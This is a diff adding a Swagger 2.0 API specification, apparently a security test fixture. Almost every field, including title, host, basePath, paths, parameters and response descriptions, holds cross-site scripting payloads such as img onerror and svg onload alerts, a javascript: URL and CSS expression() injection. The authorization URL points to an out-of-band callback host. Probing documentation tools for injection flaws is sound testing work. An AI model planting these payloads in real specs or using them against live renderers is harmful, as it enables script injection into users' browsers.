@@ -1,0 +1,100 @@
+{
+"swagger": "2.0",
+"info": {
+"title": "xxx",
+"description": "/rrr'\"><marquee>asd<svg onload=alert(1)>asd</marquee>asd<h1>asd</h1><b style='x: expression(alert(1))'>",
+"version": "2017-06-04T22:56:06+00:00<marquee>asd</marquee>asd<h1>asd</h1>",
+"contact": {
+"name": "/sss'\"><marquee>asd</marquee>asd<h1>asd</h1></script><img src=x onerror=alert(document.domain)>",
+"": "javascript:alert(document.domain)",
+"email": "x@c.s\"><h1>asde"
+}
+},
+"host": "x<marquee>asd</marquee>asd<h1>asd</h1>ok",
+"basePath": "/\"'>eee<img src=x onerror=alert(document.domain)><marquee>asd</marquee>asd<h1>asd</h1>",
+"schemes": [
+"https"
+],
+"consumes": [
+"/ttt'\"></script></select>f<marquee>asd</marquee>asd<h1>asd</h1>ff<img src=x onerror=alert(document.domain)>"
+],
+"produces": [
+"/uuu'\"></script>gg<marquee>asd</marquee>asd<h1>asd</h1>g<img src=x onerror=alert(document.domain)>"
+],
+"securityDefinitions": {
+"oauth2": {
+"flow": "implicit",
+"authorizationUrl": "http://8oxw7050uu8y0pxf44ccamadu40vopce.oastify.com/",
+"scopes": {
+"web-api": "testing"
+},
+"type": "oauth2"
+}
+},
+"security": [
+{
+"tokenHeader": [
+"/xxx'\"><img src=x onerror=alert(document.domain)>"
+]
+}
+],
+"paths": {
+"/><img src=x onerror=alert(document.domain)>": {
+"post": {
+"summary": "/'\">bbb</script><marquee>asd</marquee>asd<h1>asd</h1><img src=x onerror=alert(document.domain)>",
+"description": "/aaa'\"></script><img src=x onerror=alert(document.domain)><marquee>asd</marquee>asd<h1>asd</h1>",
+"tags": [
+"ccc"
+],
+"parameters": [
+{
+"name": "/xxx'tabindex=0 id=aaa onfocus=alert(document.domain) onmouseover=alert(document.domain) yyy\"><marquee>asd</marquee>asd<h1>asd</h1>zzz></script><img src=x onerror=alert(document.domain)>",
+"in": "body",
+"schema": {
+"type": "object",
+"required": [
+"/hhh'\"></script><img src=x onerror=alert(document.domain)>"
+],
+"properties": {
+"/ccc<img src=x onerror=alert(document.domain)>": {
+"type": "string",
+"description": "/iii'\"></script><img src=x onerror=alert(document.domain)>"
+}
+},
+"description": "/ddd'\"></script><img src=x onerror=alert(document.domain)>"
+},
+"required": true
+}
+],
+"responses": {
+"200": {
+"description": "/jjj'\"></script><img src=x onerror=alert(document.domain)>"
+},
+"400": {
+"description": "/kkk'\"></script><img src=x onerror=alert(document.domain)>",
+"schema": {
+"type": "object",
+"properties": {
+"errors": {
+"type": "object",
+"additionalProperties": {
+"type": "string"
+},
+"description": "/lll'\"></script><img src=x onerror=alert(document.domain)>"
+}
+},
+"description": "/mmm'\"></script><img src=x onerror=alert(document.domain)>"
+},
+"examples": {
+"/nnn'\"></script>\"><marquee>asd</marquee>asd<h1>asd</h1><img src=x onerror=alert(document.domain)>": {
+"errors": {
+"/ooo'\"></script><img src=x onerror=alert(document.domain)>": "/ppp'\"></script><img src=x onerror=alert(document.domain)>"
+}
+}
+}
+}
+}
+}
+}
+}
+}
